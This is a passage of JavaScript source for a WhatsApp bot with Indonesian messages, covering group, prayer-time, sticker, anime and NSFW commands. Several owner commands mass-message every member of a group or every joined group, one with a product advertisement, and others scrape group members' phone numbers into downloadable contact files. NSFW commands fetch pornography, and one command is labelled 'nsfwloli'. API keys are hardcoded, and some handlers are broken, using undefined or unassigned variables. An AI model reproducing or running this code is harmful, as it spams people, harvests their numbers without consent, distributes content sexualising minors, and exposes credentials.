if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("Otw Boskuuu")
const groupMetadataa = !m.isGroup? await TradzSigma.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
memk = await uploadwidipe(media)
await TradzSigma.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await TradzSigma.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Succes Boss!")
}
break
case 'pushkontakv4': {
if (!TradID) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("Otw Boskuuu")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
mem = await uploadwidipe(media)
await TradzSigma.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await TradzSigma.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Boss!")
}
break
case 'setautosholat':
    if (!TradID) return reply('Khusus Owner!');
    if (!text) return reply('Contoh: setautosholat on / off');

    if (text.toLowerCase() === 'on') {
        global.settings.autosholat = true;
        saveSettings();
        reply('Fitur autosholat telah *diaktifkan*.');
    } else if (text.toLowerCase() === 'off') {
        global.settings.autosholat = false;
        saveSettings();
        reply('Fitur autosholat telah *dinonaktifkan*.');
    } else {
        reply('Format tidak dikenali. Gunakan: on / off');
    }
    break;
case 'jadwalsholat': {
if (!text) return reply(`• *Contoh :* ${prefix + command} jakarta pusat`)
async function jadwalSholat(kota) {
  try {
    const { data } = await axios.get(`https://www.dream.co.id/jadwal-sholat/${kota}/`);
    const $ = cheerio.load(data);
    const rows = $(".table-index-jadwal tbody tr");
    const jadwal = [];
    rows.each((index, row) => {
      const cols = $(row).find("td");
      jadwal.push({
        subuh: $(cols[1]).text().trim(),
        duha: $(cols[2]).text().trim(),
        zuhur: $(cols[3]).text().trim(),
        asar: $(cols[4]).text().trim(),
        magrib: $(cols[5]).text().trim(),
        isya: $(cols[6]).text().trim(),
      });
    });
    return jadwal[0];
  } catch (error) {
    throw new Error("Gagal mengambil data jadwal sholat");
  }
}
  try {
    const jadwal = await jadwalSholat(text);
    const caption = `
┌「 ${text.toUpperCase()} 」
├ Subuh: ${jadwal.subuh}
├ Dhuha: ${jadwal.duha}
├ Dzuhur: ${jadwal.zuhur}
├ Ashar: ${jadwal.asar}
├ Maghrib: ${jadwal.magrib}
├ Isya: ${jadwal.isya}
└──────────`.trim();
    const thumbnailUrl = "https://files.catbox.moe/r3mbjq.jpg";
    await TradzSigma.sendMessage(m.chat, {
      text: caption,
      contextInfo: {
        forwardingScore: 2025,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363401647250932@newsletter',
          serverMessageId: null,
          newsletterName: "DinzID Chx",
        },
        externalAdReply: {
          title: `Jadwal Sholat Harian`,
          mediaType: 1,
          previewType: 1,
          body: `Informasi waktu sholat untuk kota ${text}`,
          thumbnailUrl,
          renderLargerThumbnail: true,
          mediaUrl: "https://www.islamicfinder.org",
          sourceUrl: "https://www.islamicfinder.org",
        },
      },
    }, { quoted: m });
  } catch (error) {
    replyviex("Gagal mendapatkan jadwal sholat. Pastikan nama kota benar.");
  }
}
break
case 'savekontak': case 'svkontak':{
if (!TradID) return reply(`Khusus Owner Ajah`)
if (!m.isGroup) return reply(`Fitur Ini Khusus Group`)
let cmiggc = await TradzSigma.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
TradzSigma.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
}
break
case "cekidch": case "idch": {
if (!text) return replyviex("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return replyviex("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await TradzSigma.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break
case 'cekidgc': {
if (!isPrem) return replyprem(mess.premium)
let getGroups = await TradzSigma.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await TradzSigma.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv3 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'savekontakv2': {
if (!TradID) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !m.isGroup? await TradzSigma.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await TradzSigma.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}

break
case 'jpm': {
    if (!TradID) return replyviex(mess.only.owner)
    if (!qmsg) return replyviex("Silakan reply foto/video beserta teks.\n\n.jpm Halo tradz gantengggf")
    if (!/image|video/.test(mime)) return replyviex("Format tidak didukung. Silakan kirim foto atau video.")

    const allgrup = await TradzSigma.groupFetchAllParticipating()
    const res = Object.keys(allgrup)
    let count = 0
    const teks = text
    const jid = m.chat
    const rest = await TradzSigma.downloadAndSaveMediaMessage(qmsg)

    await m.reply(`Memproses *JPM* ke ${res.length} grup...`)

    for (let i of res) {
        if (global.db.groups?.[i]?.blacklistjpm) continue
        try {
            await TradzSigma.sendMessage(i, {
                [mime.includes("image") ? "image" : "video"]: fs.readFileSync(rest),
                caption: teks,
                footer: global.footer,
                headerType: 4,
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 256,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363401647250932@newsletter',
                        newsletterName: 'TradzSigma Channel',
                        serverMessageId: -1
                    }
                }
            }, {
                quoted: qlocJpm
            })
            count += 1
        } catch (e) {
            console.log(`Gagal mengirim ke grup ${i}:`, e)
        }
        await sleep(global.delayjpm)
    }

    if (fs.existsSync(rest)) fs.unlinkSync(rest)

    await TradzSigma.sendMessage(jid, {
        text: `*JPM Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}`
    }, {
        quoted: qloc
    })
} break
case 'jpm2': case 'startjpmslide': {
if (!TradID) return m.reply(mess.owner)
let total = 0
let getGroups = await TradzSigma.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let anu = groups.map(v => v.id)
let detik = `${text.split('|')[1] / 1000}`
let time = ms(delayjpm * Number(usergc.length))
let imgsc = await prepareWAMessageMedia({ image: await fs.readFileSync("./library/data/media/Tradz.jpg") }, { upload: TradzSigma.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*RafatharCode* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `⎆ PANEL UNLI 1GB-UNLI
⎆ RESELLER PANEL (7K/PERMA)
⎆ ADMIN PANEL (10K/PERMA)
⎆ PT PANEL (15K/PERMA)
⎆ OWN PANEL (20K/PERMA)
⎆ HOSTING MINECRAFT (5K/GB)
⎆ OPEN BOT JAGA GC ANTILINK (15K/BULAN)
⎆ NOKOS INDO (7K)
⎆ DLL TANYAKAN OWNER/ADMIN`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6283844671188\",\"merchant_url\":\"https://t.me/RafatharCode\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*OPEN PANEL PRIVATE*
⎆ PANEL 1GB - UNLI (2K PER 1GB)
⎆ RESELLER PANEL PRIV (25K)

KEUNTUNGAN?
> BISA JUAL PANEL UNLI
> BISA JUAL PANEL PRIV
> UNTUNG JIKA BERUSAHA
> ANTI DDOS & OVERLOAD`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6283844671188\",\"merchant_url\":\"https://t.me/RafatharCode\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*OPEN JASA*
_*JASA BOT*_
⎆ JASA RENAME BOT
⎆ JASA RUN BOT
⎆ JASA INSTALL PANEL

_*JASA MINECRAFT*_
⎆ JASA FIX PLUGIN
⎆ JASA SETUP PLUGIN
⎆ JASA BUAT SERVER

⎆ BACKUP SERVER SIAP JADI
⎆ PLUGIN PREMIUM`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6283844671188\",\"merchant_url\":\"https://t.me/RafatharCode\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: m})
await replyviex(`Memproses Mengirim Pesan Slide Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${anu.length * 9} detik`)
for (let jid of usergc) {
try {
await TradzSigma.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await replyviex(`Berhasil Mengirim Pesan Slide Teks & Foto Ke *${total} Grup*`)
}
break

case 'sendkontak': case 'kontak':
if (!TradID) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(`Khusus Group`)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snContact = {
	displayName: "Contact", contacts: [{displayName: ownername, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownername+";;;\nFN:"+ownername+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
TradzSigma.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break

case 'getcontact': case 'getkontak':
if (!TradID) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(`Fitur Ini Khusus Group`)
huhuhs = await TradzSigma.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
TradzSigma.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break

            case 'id':{
            replyviex(from)
           }
          break
          case 'userjid':{
          	if(!TradID) return reply(mess.only.owner)
        const groupMetadata = m.isGroup ? await TradzSigma.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replyviex(textt)
    }
    break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replyviex(`Contoh : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replyviex(`Contoh : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await TradzSigma.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	case 'hentaivid2': {
if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/nsfw-nime/hentai-mp4?apikey=qzu9Ja5Q`}, 
caption: `success` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/nsfw-nime/hentai-mp4?apikey=qzu9Ja5Q`}, 
caption: `success` }, { quoted: m })
            }
            break
case 'trap' :
if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!isPrem) return replyprem(mess.premium)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./library/data/TradMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'ass':
case 'ahegao':
case 'bdsm':
case 'blowjob':
case 'cuckold':
case 'cum':
case 'eba':
case 'ero':
case 'femdom':
case 'food':
case 'gangbang':
case 'glasses':
case 'jahy':
case 'masturbation':
case 'neko-hentai':
case 'neko-hentai2':
case 'nsfwloli':
case 'orgy':
case 'panties':
case 'pussy':
case 'tentacles':
case 'thighs':
case 'hentai': {
 TradzSigma.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
 if (!isPrem) return replyprem(mess.premium)
try {
async function scrapeData() {
    try {
const page = Math.floor(Math.random() * 50);
        const { data } = await axios.get('https://e-hentai.org/tag/random?prev=' + page);
        const $ = cheerio.load(data);
        const results = [];
        $('.glthumb').each((index, element) => {
            const img = $(element).find('img');
            const imgSrc = img.attr('data-src');
            
            if (imgSrc) {
                results.push(imgSrc);
            }
        });
        return results
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}
function getRandomElement(array) {
    const randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}
const jmebut = await scrapeData()
const randomUrl = getRandomElement(jmebut);
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: randomUrl } }, { quoted: m })
  } catch (error) {
    return replyviex(`💥 Terjadi kesalahan saat mengambil data: ${error.message}`);
  }
}
break
case 'mangasearch': {
if (!isPrem) return replyprem(mess.premium)
if (!text) return reply('mau cari manga apa??')
try {
const data = await KlikMangaSearch(text);
    let resultMessage = data.map(manga => 
      `🎬 *Judul:* ${manga.manga_name}\n` +
      `⭐ *Rating:* ${manga.manga_genre}\n` +
      `📖 *Deskripsi:* ${manga.manga_desc}\n` +
      `🔗 *URL:* ${manga.manga_url}\n`
    ).join('\n');
    TradzSigma.sendMessage(
      from, 
      { 
        caption: `🌟 *Hasil Pencarian Film*\n\n${resultMessage}`, 
        image: { url: data.manga_thumb[0]}, 
      }, 
      { quoted: m }
    );
  } catch (error) {
    return replyviex(`💥 Terjadi kesalahan saat mengambil data: ${error.message}`);
  }
}
break
case 'yuri':
if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./library/data/TradMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!isPrem) return replyprem(mess.premium)
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
var ahegaonsfw = JSON.parse(fs.readFileSync('./library/data/TradMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
TradzSigma.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replyviex(mess.nsfw)
replyviex(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await TradzSigma.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replyviex(mess.nsfw)
replyviex(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./library/data/TradMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await TradzSigma.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replyviex(mess.nsfw)
replyviex(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
TradzSigma.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'animeawoo':{
 if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animemegumin':{
if (!isPrem) return replyprem(mess.premium)
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeshinobu':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehandhold':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehighfive':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecringe':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animedance':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehappy':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeglomp':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmug':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeblush':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewave':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmile':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepoke':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewink':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebonk':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebully':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeyeet':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebite':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animelick':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekill':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecry':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewlp':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekiss':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehug':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break

case 'couplepp': case 'ppcouple': {
replyviex(mess.wait)
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
TradzSigma.sendMessage(m.chat, { image: { url: random.male }, caption: `sukses kak couple male` }, { quoted: m })
TradzSigma.sendMessage(m.chat, { image: { url: random.female }, caption: `sukses kak couple female` }, { quoted: m })
            }
	    break

case 'animeneko':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepat':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeslap':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecuddle':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewaifu':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animenom':{
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefoxgirl':{
replyviex(mess.wait)
